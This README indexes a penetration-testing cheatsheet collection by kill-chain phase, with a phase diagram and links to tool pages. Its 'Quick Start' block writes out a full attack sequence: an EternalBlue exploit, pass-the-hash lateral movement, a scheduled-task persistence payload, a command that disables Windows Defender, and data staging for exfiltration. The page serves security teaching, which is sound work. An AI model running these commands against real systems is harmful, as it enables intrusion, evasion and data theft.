# 🎯 Attack Methodology - Kill Chain

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 What is the Attack Kill Chain?

The **Attack Kill Chain** (also known as **Cyber Kill Chain** or **MITRE ATT&CK**) describes the phases an attacker goes through to compromise and exploit a target system or network.

---

## 📊 Kill Chain Phases

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK LIFECYCLE                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. INITIAL   │───▶│ 2. DISCOVERY │───▶│ 3. PRIVILEGE         │        │
│   │    ACCESS    │    │ ENUMERATION  │    │    ESCALATION        │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. LATERAL           │          │
│          │                               │    MOVEMENT          │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. ACTIONS   │◀───│ 6. DEFENSE   │◀───│ 5. PERSISTENCE       │        │
│   │ ON OBJECTIVES│    │    EVASION   │    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Phase Guides

| Phase | Description | Guide |
|-------|-------------|-------|
| **1. Initial Access** | First foothold into the target | [📄 View](./01-Initial-Access.md) |
| **2. Discovery/Enumeration** | Gather information about the compromised system | [📄 View](./02-Enumeration.md) |
| **3. Privilege Escalation** | Elevate privileges to admin/root | [📄 View](./03-Privilege-Escalation.md) |
| **4. Lateral Movement** | Move across the network to other systems | [📄 View](./04-Lateral-Movement.md) |
| **5. Persistence** | Maintain access after reboots/detection | [📄 View](./05-Persistence.md) |
| **6. Defense Evasion** | Bypass AV, EDR, and security controls | [📄 View](./06-Defense-Evasion.md) |
| **7. Actions on Objectives** | Achieve the final goal (exfil, impact) | [📄 View](./07-Actions-Objectives.md) |

---

## 🔗 Related Cheatsheets

### By Phase

| Phase | Related Tools |
|-------|---------------|
| Initial Access | [Metasploit](../Metasploit/README.md), [SQLMap](../SQLMap/README.md), [Hydra](../Hydra/README.md) |
| Enumeration | [Nmap](../Nmap/README.md), [BloodHound](../BloodHound/README.md), [PowerView](../PowerView/README.md) |
| Privilege Escalation | [Linux-PrivEsc](../Linux-PrivEsc/README.md), [Windows-PrivEsc](../Windows-PrivEsc/README.md) |
| Lateral Movement | [Impacket](../Impacket/README.md), [CrackMapExec](../CrackMapExec/README.md), [Evil-WinRM](../Evil-WinRM/README.md) |
| Persistence | [PowerShell](../PowerShell/README.md), [Metasploit](../Metasploit/README.md) |
| Defense Evasion | [Mimikatz](../Mimikatz/README.md), [PowerShell](../PowerShell/README.md) |
| Data Exfiltration | [Linux-Commands](../Linux-Commands/README.md) |

---

## 📚 Quick Start

### Typical Attack Flow
```bash
# 1. Initial Access - Exploit a vulnerability
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Enumeration - Discover what you have access to
whoami /all
systeminfo
net user

# 3. Privilege Escalation - Get SYSTEM/root
.\winPEAS.exe

# 4. Lateral Movement - Move to other systems
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Persistence - Maintain access
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Defense Evasion - Disable AV
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Actions on Objectives - Exfiltrate data
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Resources

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 Follow the Kill Chain!</b><br>
  <i>For authorized penetration testing only!</i>
</p>
